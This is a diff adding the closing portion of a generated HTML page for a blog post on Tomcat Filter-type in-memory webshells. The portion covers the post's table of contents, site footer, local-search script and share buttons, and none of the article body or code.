+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text"> 0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-tomcat-filter%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text"> 0x02 Tomcat Filter 流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%AE%BF%E9%97%AE-filter-%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text"> 在访问 &#x2F;filter 之后的流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%AE%BF%E9%97%AE-filter-%E4%B9%8B%E5%89%8D%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text"> 在访问 &#x2F;filter 之前的流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text"> 小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-filter%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text"> 0x03 Filter 内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#servletcontext%E8%B7%9Fstandardcontext%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-text"> ServletContext 跟 StandardContext 的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96standardcontext"><span class="toc-text"> 如何获取 StandardContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-text"> poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93"><span class="toc-text"> 0x04 一些点的总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F08%2F11%2FTomcat-Filter%25E5%259E%258B%25E5%2586%2585%25E5%25AD%2598%25E9%25A9%25AC%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/08/11/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
